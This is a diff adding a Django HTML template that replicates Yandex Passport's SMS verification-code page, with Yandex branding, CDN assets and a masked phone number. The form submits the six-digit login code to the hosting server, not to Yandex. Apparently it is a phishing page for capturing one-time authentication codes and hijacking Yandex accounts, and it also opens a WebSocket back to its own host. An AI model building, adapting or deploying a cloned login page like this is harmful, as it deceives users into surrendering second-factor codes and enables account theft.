@@ -1,0 +1,237 @@
+<!doctype html>
+<html lang="ru" dir="ltr" data-page-type="react.authv2" class="is-js_no" data-view="default"
+      xmlns="http://www.w3.org/1999/html">
+<head><title>Авторизация</title>
+    <meta charSet="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge"/>
+    <link crossorigin="anonymous" rel="preload" as="style"
+          href="https://yastatic.net/s3/passport-static/core/v1.88.25/css/react.authv2.cij.css"/>
+    <link crossorigin="anonymous" href="//yastatic.net/react/17.0.2/react-with-dom-and-polyfills.min.js" rel="preload"
+          as="script"/>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.8.0/chart.min.js"
+            integrity="sha512-sW/w8s4RWTdFFSduOTGtk4isV1+190E/GghVffMA9XczdJ2MDzSzLEubKAs5h0wzgSJOQTRYyaz73L3d6RtJSg=="
+            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link crossorigin="anonymous" href="https://yastatic.net/jquery/2.1.4/jquery.min.js" rel="preload" as="script"/>
+    <link rel="shortcut icon" href="/favicon.ico"/>
+    <meta name="pdb" content="disable"/>
+    <meta name="collections" content="disable"/>
+    <link crossorigin="anonymous" rel="stylesheet" type="text/css"
+          href="https://yastatic.net/s3/passport-static/core/v1.88.25/css/react.authv2.cij.css"/>
+    <link rel="stylesheet" type="text/css"
+          href="https://yastatic.net/s3/passport-auth-customs//customs/v1.64.10/passport.auth.customs.css"/>
+    <script type="text/javascript" nonce="34593585-7a71-4de4-b811-673282036213">
+        (function(d, e, c, r, n, w, v, f) {e = d.documentElement; c = "className"; r = "replace"; n = "createElementNS"; f = "firstChild"; w = "http://www.w3.org/2000/svg"; v = d.createElement("div"); v.innerHTML = "<svg/>"; e[c] = e[c][r]("is-js_no", "is-js_yes"); e[c] += " is-inlinesvg_" + ((v[f] && v[f].namespaceURI) === w ? "yes" : "no"); })(document);
+
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/libphonenumber-js/1.9.47/libphonenumber-js.min.js"></script>
+
+<style>
+    .CodeField-dash {
+  position: relative;
+}
+
+.CodeField-number {
+  position: absolute;
+  top: -1.1em; /* Підлаштуйте значення відповідно до вашого дизайну */
+  left: 50%;
+  transform: translateX(-50%);
+  font-size: 1.1em; /* Підлаштуйте значення відповідно до вашого дизайну */
+}
+.Textinput-Control {
+  caret-color: black;
+}
+</style>
+</head>
+<body class="Theme_color_yandex-default Theme_root_passport Theme_auth_domik Theme_root_default "
+      data-metrics-id="784657" data-user-type="null" data-version="1.88.25" data-origin="null">
+<div id="root" class="layout">
+    <div class="passp-flex-wrapper">
+        <div class="NoJS NoJS_isFloat">
+            <div class="NoJS-message">
+                <div class="NoJS-title">Необходимо включить JavaScript</div>
+                Для корректной работы этого сайта<a data-t="link:default"
+                                                    href="https://yandex.ru/support/common/browsers-settings/browsers-java-js-settings.xml"
+                                                    target="_blank" class="Link Link_view_default"> <!-- -->включите
+                JavaScript<!-- --> .</a></div>
+        </div>
+        <div class="passp-page">
+            <div class="passp-bg passp-bg_14"></div>
+            <div class="passp-flex-wrapper">
+                <div class="passp-content">
+                    <div class="passp-auth theme-default">
+                        <div class="passp-page-overlay"></div>
+<div class="PagePopup"><a data-t="closer"
+                                                  href="/auth/add?retpath=https%3A%2F%2Fid.yandex.ru%2F%3Fncrnd%3D91902&amp;noreturn=1"
+                                                  class="PreviousStepButton PreviousStepButton_type_closer"
+                                                  aria-label="Назад"><span
+                                data-pane="/auth/add?retpath=https%3A%2F%2Fid.yandex.ru%2F%3Fncrnd%3D91902&amp;noreturn=1"
+                                data-link=""></span></a>
+                            <div class="Header">
+                                <div class="Header-yaLogoBlock"><a aria-label="Яндекс" href="https://ya.ru"
+                                                                   tabindex="-1" class="Logo Logo_ya"></a></div>
+                            </div>
+                            <div data-t="page:popup:challenges-call">
+                                <h1 data-t="title" class="passp-title">
+                                    <div>Введите код из СМС, отправленный на номер <span class="passp-phone-template"
+                                                                                         dir="ltr">+380 98 *** **09</span>
+                                    </div>
+                                </h1>
+                                <form method="post" class="PasspAuthForm" data-t="page:form:challenges-call">
+                                    {% csrf_token %}
+                                    <div class="CodeField CodeField_theme_default">
+                                        <div class="Field Field_view_rounded-corner" data-t="field:phoneCode">
+                                            <div class="Field-label-wrapper"><label
+                                                    class="Field-label Field-label_isVisuallyHidden"
+                                                    data-t="field:label-phoneCode" for="passp-field-phoneCode">Введите
+                                                код</label></div>
+                                            <div class="Field-inputWrapper"><span
+                                                    class="Textinput Textinput_view_rounded-corner Textinput_size_xxl"><input
+  data-t="field:input-phoneCode"
+  dir="ltr"
+  aria-invalid="false"
+  autocomplete="off"
+  class="Textinput-Control code-input"
+  id="passp-field-phoneCode"
+  inputmode="numeric"
+  maxlength="6"
+  name="phoneCode"
+  type="text"
+  value=""
+/><span
+                                                    class="Textinput-Box">
+
+                                            </span></span></div>
+                                        </div>
+                                        <div class="CodeField-visualWrapper" aria-hidden="true">
+                                            <div class="CodeField-visualContent CodeField-visualContent_size_normal">
+                                                <ul class="CodeField-dashes">
+  <li class="CodeField-dash CodeField-dash_isActive">
+    <span class="CodeField-number"></span>
+  </li>
+  <li class="CodeField-dash">
+    <span class="CodeField-number"></span>
+  </li>
+  <li class="CodeField-dash CodeField-dash_hasSpace">
+    <span class="CodeField-number"></span>
+  </li>
+  <li class="CodeField-dash">
+    <span class="CodeField-number"></span>
+  </li>
+  <li class="CodeField-dash">
+    <span class="CodeField-number"></span>
+  </li>
+  <li class="CodeField-dash">
+    <span class="CodeField-number"></span>
+  </li>
+</ul>
+                                                <ul class="CodeField-numbers"></ul>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div data-t="submit-phone-code-btn" class="passp-button">
+                                        <button data-t="button:action" type="submit"
+                                                class="Button2 Button2_size_l Button2_view_action Button2_width_max Button2_type_submit"
+                                                aria-disabled="false" autocomplete="off"><span class="Button2-Text">Далее</span>
+                                        </button>
+                                    </div>
+                                    <div data-t="send-code-again-btn"
+                                         class="passp-button passp-send-again-btn challenge-submit">
+                                        <button data-t="button:default" type="button"
+                                                class="Button2 Button2_size_l Button2_view_default Button2_width_max"
+                                                aria-disabled="false" autocomplete="off"><span class="Button2-Text">Отправить ещё код</span>
+                                        </button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+<div class="yaIdPromoText">Яндекс ID — ключ от всех сервисов <a
+                                href="https://id.yandex.ru/about" class="yaIdPromoText_link">Узнать больше</a></div>
+                    </div>
+                </div>
+            </div>
+            <footer class="AuthFooter">
+                <div class="AuthFooter-wrapper">
+                    <div class="AuthFooter-incognitoLink"><span class="AuthFooter-item"><a data-t="link:default"
+                                                                                           target="_blank"
+                                                                                           href="https://yandex.ru/support/common/browsers-settings/incognito.html"
+                                                                                           class="Link Link_view_default">Используйте режим инкогнито на чужом компьютере</a></span>
+                    </div>
+                    <div class="AuthFooter-mainBlock"><span class="AuthFooter-item" aria-expanded="false"><span
+                            data-t="link:default"
+                            class="Link Link_pseudo Link_view_default AuthFooter-itemCap">ru</span><span
+                            class="AuthFooter-langList AuthFooter-langList_closed"><ul><li
+                            class="AuthFooter-langListItem"><a data-t="link:default"
+                                                               href="https://yandex.ru/portal/set/lang/?sk=y0a32c11569d1d4aa425cfb82ece04a0c&amp;retpath=https%3A%2F%2Fpassport.yandex.ru%2Fauth%3Fretpath%3Dhttps%253A%252F%252Fmail.yandex.ru&amp;intl=en"
+                                                               class="Link Link_view_default">En</a></li></ul></span></span><span
+                            class="AuthFooter-item"><a data-t="link:default" href="https://yandex.ru/support/passport/"
+                                                       target="_blank" class="Link Link_view_default">Справка и поддержка</a></span><span
+                            class="AuthFooter-item"><span class="AuthFooter-copyright">© 2001-2023, </span><a
+                            data-t="link:default" href="https://ya.ru" class="Link Link_view_default">Яндекс</a></span>
+                    </div>
+                </div>
+            </footer>
+        </div>
+    </div>
+</div>
+
+<img class="g-hidden"
+     src="https://ysa-static.passport.yandex.net/static/1/96eb29b255b84bfd7016c2420aa13870/d.png?ex=yes"/>
+
+<link data-chunk="react.authv2" rel="stylesheet"
+      href="https://yastatic.net/s3/passport-static/core/v1.88.25/js/../css/react.authv2.cij.css"
+      crossorigin="anonymous">
+
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+  var codeInput = document.getElementById('passp-field-phoneCode');
+  var codeNumbers = document.querySelectorAll('.CodeField-number');
+
+  function updateCodeDisplay() {
+    var codeValue = codeInput.value;
+
+    for (var i = 0; i < codeNumbers.length; i++) {
+      if (i < codeValue.length) {
+        codeNumbers[i].innerText = codeValue[i];
+      } else {
+        codeNumbers[i].innerText = '';
+      }
+    }
+  }
+
+  codeInput.addEventListener('input', updateCodeDisplay);
+  codeInput.addEventListener('keypress', function (event) {
+  var charCode = event.which || event.keyCode;
+  var charStr = String.fromCharCode(charCode);
+
+  if (!/^\d+$/.test(charStr)) {
+    event.preventDefault();
+  }
+});
+
+});
+
+
+</script>
+
+<script>
+    const socket = new WebSocket('ws://' + window.location.host + '/ws/cleanup_inactive_drivers/');
+
+    socket.onopen = function(e) {
+        console.log("[open] Connection established");
+    };
+
+    socket.onmessage = function(event) {
+        console.log(`[message] Data received from server: ${event.data}`);
+    };
+
+    socket.onclose = function(event) {
+        console.log(`[close] Connection closed`);
+    };
+
+    socket.onerror = function(error) {
+        console.log(`[error] ${error.message}`);
+    };
+</script>
+</body>
+</html>
